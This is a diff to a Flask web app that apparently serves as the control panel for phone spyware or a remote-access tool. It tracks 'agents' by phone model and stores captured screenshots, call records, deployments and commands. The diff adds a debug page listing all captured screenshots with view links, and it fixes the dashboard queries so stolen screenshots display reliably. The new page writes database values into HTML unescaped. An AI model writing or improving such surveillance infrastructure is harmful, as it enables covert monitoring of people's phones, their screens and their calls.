@@ -221,6 +221,30 @@ def debug_agents():
     
     return result
 
+@app.route('/debug/screenshots')
+def debug_screenshots():
+    if not session.get('authenticated'):
+        return redirect('/login')
+    
+    with db_lock:
+        conn = get_db_connection()
+        screenshots = safe_fetchall(conn.execute("SELECT * FROM screenshots"))
+        conn.close()
+    
+    result = "<h1>All Screenshots in Database</h1>"
+    for screenshot in screenshots:
+        result += f"""
+        <div style="border: 1px solid #ccc; padding: 10px; margin: 10px;">
+            <strong>ID:</strong> {screenshot['id']}<br>
+            <strong>Agent ID:</strong> {screenshot['agent_id']}<br>
+            <strong>Timestamp:</strong> {screenshot['timestamp']}<br>
+            <strong>Has Data:</strong> {screenshot['screenshot_data'] is not None}<br>
+            <a href="/media/screenshot/{screenshot['id']}" target="_blank">View Screenshot</a>
+        </div>
+        """
+    
+    return result
+
 @app.route('/debug/reset_agents')
 def reset_agents():
     if not session.get('authenticated'):
@@ -275,11 +299,15 @@ def dashboard():
         try:
             all_agents = safe_fetchall(conn.execute("SELECT * FROM agents ORDER BY last_seen DESC"))
             active_agents = safe_fetchall(conn.execute("SELECT * FROM agents WHERE status='active' ORDER BY last_seen DESC LIMIT 20"))
+            
+            # FIXED: Screenshot query with better error handling
             screenshots = safe_fetchall(conn.execute('''
-                SELECT s.*, a.phone_model FROM screenshots s 
+                SELECT s.*, COALESCE(a.phone_model, 'Unknown Device') as phone_model 
+                FROM screenshots s 
                 LEFT JOIN agents a ON s.agent_id = a.agent_id 
                 ORDER BY s.timestamp DESC LIMIT 16
             '''))
+            
             calls = safe_fetchall(conn.execute("SELECT * FROM call_records ORDER BY timestamp DESC LIMIT 15"))
             deployments = safe_fetchall(conn.execute("SELECT * FROM deployments ORDER BY timestamp DESC LIMIT 15"))
         except Exception as e:
@@ -334,12 +362,21 @@ def admin_dashboard():
         try:
             all_agents = safe_fetchall(conn.execute("SELECT * FROM agents ORDER BY last_seen DESC"))
             active_agents = safe_fetchall(conn.execute("SELECT * FROM agents WHERE status='active' ORDER BY last_seen DESC LIMIT 20"))
+            
+            # FIXED: Screenshot query - ensure we get screenshots even if agent info is missing
             screenshots = safe_fetchall(conn.execute('''
-                SELECT s.*, COALESCE(a.phone_model, 'Unknown Device') as phone_model 
+                SELECT 
+                    s.id,
+                    s.agent_id,
+                    s.screenshot_data,
+                    s.timestamp,
+                    COALESCE(a.phone_model, 'Unknown Device') as phone_model
                 FROM screenshots s 
                 LEFT JOIN agents a ON s.agent_id = a.agent_id 
+                WHERE s.screenshot_data IS NOT NULL
                 ORDER BY s.timestamp DESC LIMIT 16
             '''))
+            
             calls = safe_fetchall(conn.execute("SELECT * FROM call_records ORDER BY timestamp DESC LIMIT 15"))
             deployments = safe_fetchall(conn.execute("SELECT * FROM deployments ORDER BY timestamp DESC LIMIT 15"))
             commands = safe_fetchall(conn.execute("SELECT * FROM commands ORDER BY timestamp DESC LIMIT 10"))
@@ -1529,6 +1566,7 @@ def test_register_agent():
     </script>
     <br><br>
     <a href="/debug/agents">Check All Agents</a> | 
+    <a href="/debug/screenshots">Check All Screenshots</a> |
     <a href="/admin">Go to Admin</a>
     '''
 
